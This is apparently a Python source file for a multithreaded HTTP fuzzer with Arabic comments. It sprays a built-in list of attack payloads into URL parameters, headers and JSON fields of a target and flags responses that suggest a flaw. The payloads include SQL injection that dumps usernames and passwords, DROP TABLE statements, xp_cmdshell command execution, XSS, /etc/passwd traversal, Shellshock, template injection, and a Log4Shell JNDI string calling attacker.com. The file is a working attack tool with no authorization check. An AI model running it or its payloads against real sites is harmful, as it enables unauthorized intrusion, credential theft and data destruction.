#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import time
import json
import random
import logging
import requests
import threading
from queue import Queue
from urllib.parse import urlparse, parse_qs, urlencode
from colorama import Fore, Style
from tqdm import tqdm

from urlget.utils import setup_logger

class HTTPFuzzer:
    """فئة للقوة الغاشمة والتشويش لطلبات HTTP"""
    
    def __init__(self, url, method="GET", payloads_file=None, threads=10, verbose=False):
        """تهيئة المشوش"""
        self.url = url
        self.method = method.upper()
        self.payloads_file = payloads_file
        self.threads = threads
        self.verbose = verbose
        
        # إعداد السجل
        self.logger = setup_logger("HTTPFuzzer", level=logging.DEBUG if verbose else logging.INFO)
        
        # قوائم لتخزين البيانات
        self.payloads = []
        self.results = []
        self.vulnerable_params = []
        
        # قائمة انتظار للمعالجة المتوازية
        self.queue = Queue()
        
        # قفل للتزامن
        self.print_lock = threading.Lock()
        self.results_lock = threading.Lock()
    
    def load_payloads(self):
        """تحميل الحمولات من ملف أو استخدام الحمولات الافتراضية"""
        if self.payloads_file and os.path.exists(self.payloads_file):
            try:
                with open(self.payloads_file, 'r', encoding='utf-8') as f:
                    self.payloads = [line.strip() for line in f if line.strip()]
                self.logger.info(f"تم تحميل {len(self.payloads)} حمولة من الملف")
            except Exception as e:
                self.logger.error(f"فشل في تحميل الحمولات من الملف: {str(e)}")
                self._use_default_payloads()
        else:
            self._use_default_payloads()
    
    def _use_default_payloads(self):
        """استخدام الحمولات الافتراضية"""
        self.payloads = [
            "' OR 1=1 --",
            "' OR '1'='1",
            "1' OR '1' = '1",
            "' UNION SELECT 1,2,3 --",
            "admin' --",
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "${jndi:ldap://attacker.com/a}",
            "() { :; }; echo vulnerable",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "*&()|<>[]{}:;",
            "true, $where: '1 == 1'",
            "'; DROP TABLE users; --",
            "1; DROP TABLE users",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176707671,0x4f6e6f6e6f,0x716a717671)-- -",
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "sleep(10)",
            "pg_sleep(10)",
            "WAITFOR DELAY '0:0:10'",
            "AND 1=1",
            "AND 1=2",
            "OR 1=1",
            "OR 1=2",
            "UNION ALL SELECT",
            "' AND SLEEP(5) AND '1'='1",
            "' AND SLEEP(5) --",
            "' OR SLEEP(5) OR '",
            "' WAITFOR DELAY '0:0:5' --",
            "'; WAITFOR DELAY '0:0:5' --",
            "1 OR SLEEP(5)",
            "1) OR SLEEP(5)",
            "1' OR SLEEP(5)",
            "1') OR SLEEP(5)",
            "1)) OR SLEEP(5)",
            "'; exec master..xp_cmdshell 'ping 10.10.10.10'--",
            "'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-",
            "' UNION SELECT @@version --",
            "' UNION SELECT username, password FROM users --",
            "' UNION SELECT table_name, column_name FROM information_schema.columns --",
            "' AND 1=convert(int,(SELECT @@version)) --",
            "' AND 1=convert(int,(SELECT user)) --",
            "' AND 1=convert(int,(SELECT db_name())) --",
            "' AND 1=convert(int,(SELECT table_name FROM information_schema.tables)) --",
            "' AND 1=convert(int,(SELECT column_name FROM information_schema.columns)) --",
            "' AND 1=convert(int,(SELECT CONCAT(username,':',password) FROM users)) --"
        ]
        self.logger.info(f"استخدام {len(self.payloads)} حمولة افتراضية")
    
    def parse_url(self):
        """تحليل عنوان URL واستخراج المعلمات"""
        parsed_url = urlparse(self.url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        params = parse_qs(parsed_url.query)
        
        return base_url, params
    
    def worker(self):
        """عامل لمعالجة الطلبات من قائمة الانتظار"""
        while not self.queue.empty():
            task = self.queue.get()
            try:
                self._process_task(task)
            except Exception as e:
                with self.print_lock:
                    self.logger.error(f"خطأ في معالجة المهمة: {str(e)}")
            finally:
                self.queue.task_done()
    
    def _process_task(self, task):
        """معالجة مهمة واحدة (طلب HTTP)"""
        url = task['url']
        method = task['method']
        params = task.get('params', {})
        data = task.get('data', {})
        headers = task.get('headers', {})
        payload = task.get('payload', '')
        param_name = task.get('param_name', '')
        
        try:
            start_time = time.time()
            
            if method == "GET":
                response = requests.get(url, params=params, headers=headers, timeout=10, allow_redirects=False)
            elif method == "POST":
                response = requests.post(url, params=params, data=data, headers=headers, timeout=10, allow_redirects=False)
            elif method == "PUT":
                response = requests.put(url, params=params, data=data, headers=headers, timeout=10, allow_redirects=False)
            elif method == "DELETE":
                response = requests.delete(url, params=params, headers=headers, timeout=10, allow_redirects=False)
            else:
                with self.print_lock:
                    self.logger.warning(f"طريقة HTTP غير مدعومة: {method}")
                return
            
            elapsed_time = time.time() - start_time
            
            # تحليل الاستجابة
            result = {
                'url': url,
                'method': method,
                'param_name': param_name,
                'payload': payload,
                'status_code': response.status_code,
                'response_time': elapsed_time,
                'response_length': len(response.text),
                'response_headers': dict(response.headers),
            }
            
            # التحقق من الاستجابة للبحث عن علامات الضعف
            is_vulnerable = self._check_vulnerability(response, payload)
            result['is_vulnerable'] = is_vulnerable
            
            if is_vulnerable:
                with self.print_lock:
                    print(f"{Fore.RED}[!] تم العثور على نقطة ضعف محتملة!{Style.RESET_ALL}")
                    print(f"  URL: {url}")
                    print(f"  المعلمة: {param_name}")
                    print(f"  الحمولة: {payload}")
                    print(f"  رمز الحالة: {response.status_code}")
                    print(f"  وقت الاستجابة: {elapsed_time:.2f} ثانية")
                    print(f"  طول الاستجابة: {len(response.text)} بايت")
                
                with self.results_lock:
                    self.vulnerable_params.append({
                        'param_name': param_name,
                        'payload': payload,
                        'url': url
                    })
            
            with self.results_lock:
                self.results.append(result)
            
        except requests.exceptions.Timeout:
            with self.print_lock:
                self.logger.warning(f"انتهت مهلة الطلب: {url}")
        except requests.exceptions.RequestException as e:
            with self.print_lock:
                self.logger.error(f"خطأ في الطلب: {str(e)}")
    
    def _check_vulnerability(self, response, payload):
        """التحقق من الاستجابة للبحث عن علامات الضعف"""
        # التحقق من وجود الحمولة في الاستجابة (انعكاس)
        if payload in response.text:
            return True
        
        # التحقق من رموز الحالة غير العادية
        if response.status_code >= 500:
            return True
        
        # التحقق من رسائل الخطأ الشائعة
        error_patterns = [
            "SQL syntax", "mysql_fetch_array", "mysqli_fetch_array",
            "ORA-", "Oracle error", "PostgreSQL ERROR",
            "ODBC SQL Server Driver", "Microsoft SQL Native Client error",
            "XPATH syntax error", "syntax error", "unclosed quotation mark",
            "unterminated string", "error in your SQL syntax"
        ]
        
        for pattern in error_patterns:
            if pattern.lower() in response.text.lower():
                return True
        
        return False
    
    def fuzz_params(self):
        """تشويش معلمات URL"""
        base_url, params = self.parse_url()
        
        if not params:
            self.logger.warning("لم يتم العثور على معلمات في عنوان URL")
            return
        
        self.logger.info(f"تشويش {len(params)} معلمات في عنوان URL")
        
        # إنشاء مهام للتشويش
        for param_name in params:
            for payload in self.payloads:
                # نسخ المعلمات الأصلية
                new_params = {k: v[0] if isinstance(v, list) and len(v) > 0 else v for k, v in params.items()}
                
                # استبدال قيمة المعلمة بالحمولة
                new_params[param_name] = payload
                
                # إنشاء مهمة
                task = {
                    'url': base_url,
                    'method': self.method,
                    'params': new_params,
                    'payload': payload,
                    'param_name': param_name
                }
                
                # إضافة المهمة إلى قائمة الانتظار
                self.queue.put(task)
    
    def fuzz_headers(self):
        """تشويش رؤوس HTTP"""
        base_url, params = self.parse_url()
        
        # قائمة برؤوس HTTP الشائعة للتشويش
        headers_to_fuzz = [
            "User-Agent", "Referer", "X-Forwarded-For", "Cookie",
            "Authorization", "X-API-Key", "Content-Type"
        ]
        
        self.logger.info(f"تشويش {len(headers_to_fuzz)} رؤوس HTTP")
        
        # إنشاء مهام للتشويش
        for header_name in headers_to_fuzz:
            for payload in self.payloads:
                # إنشاء رؤوس مخصصة
                headers = {header_name: payload}
                
                # إنشاء مهمة
                task = {
                    'url': base_url,
                    'method': self.method,
                    'params': {k: v[0] if isinstance(v, list) and len(v) > 0 else v for k, v in params.items()},
                    'headers': headers,
                    'payload': payload,
                    'param_name': f"Header:{header_name}"
                }
                
                # إضافة المهمة إلى قائمة الانتظار
                self.queue.put(task)
    
    def fuzz_json_body(self):
        """تشويش جسم JSON"""
        base_url, params = self.parse_url()
        
        # بيانات JSON الافتراضية للتشويش
        json_data = {
            "username": "user",
            "password": "pass",
            "email": "user@example.com",
            "id": "1"
        }
        
        self.logger.info(f"تشويش {len(json_data)} حقول JSON")
        
        # إنشاء مهام للتشويش
        for field_name in json_data:
            for payload in self.payloads:
                # نسخ بيانات JSON الأصلية
                new_json_data = json_data.copy()
                
                # استبدال قيمة الحقل بالحمولة
                new_json_data[field_name] = payload
                
                # إنشاء مهمة
                task = {
                    'url': base_url,
                    'method': "POST",  # استخدام POST لبيانات JSON
                    'params': {k: v[0] if isinstance(v, list) and len(v) > 0 else v for k, v in params.items()},
                    'data': json.dumps(new_json_data),
                    'headers': {"Content-Type": "application/json"},
                    'payload': payload,
                    'param_name': f"JSON:{field_name}"
                }
                
                # إضافة المهمة إلى قائمة الانتظار
                self.queue.put(task)
    
    def start(self):
        """بدء عملية التشويش"""
        print(f"{Fore.GREEN}[+] بدء التشويش والقوة الغاشمة لطلبات HTTP...{Style.RESET_ALL}")
        
        # تحميل الحمولات
        self.load_payloads()
        
        # إنشاء مهام التشويش
        self.fuzz_params()
        self.fuzz_headers()
        self.fuzz_json_body()
        
        total_tasks = self.queue.qsize()
        print(f"{Fore.CYAN}[*] تم إنشاء {total_tasks} مهمة للتشويش{Style.RESET_ALL}")
        
        if total_tasks == 0:
            print(f"{Fore.YELLOW}[!] لم يتم إنشاء أي مهام للتشويش. تأكد من أن عنوان URL يحتوي على معلمات.{Style.RESET_ALL}")
            return
        
        # إنشاء مؤشر التقدم
        progress_bar = tqdm(total=total_tasks, desc="التقدم", unit="طلب")
        
        # إنشاء مواضيع العمال
        threads = []
        for _ in range(min(self.threads, total_tasks)):
            thread = threading.Thread(target=self.worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # تحديث مؤشر التقدم
        while not self.queue.empty():
            completed = total_tasks - self.queue.qsize()
            progress_bar.n = completed
            progress_bar.refresh()
            time.sleep(0.1)
        
        # انتظار اكتمال جميع المهام
        self.queue.join()
        progress_bar.close()
        
        # عرض النتائج
        print(f"\n{Fore.GREEN}[+] اكتمل التشويش!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] تم اختبار {len(self.results)} طلبات{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] تم العثور على {len(self.vulnerable_params)} نقاط ضعف محتملة{Style.RESET_ALL}")
        
        if self.vulnerable_params:
            print(f"\n{Fore.YELLOW}[!] نقاط الضعف المحتملة:{Style.RESET_ALL}")
            for vuln in self.vulnerable_params:
                print(f"  - المعلمة: {vuln['param_name']}")
                print(f"    الحمولة: {vuln['payload']}")
                print(f"    URL: {vuln['url']}")
                print()
        
        return {
            'total_requests': len(self.results),
            'vulnerable_params': self.vulnerable_params
        }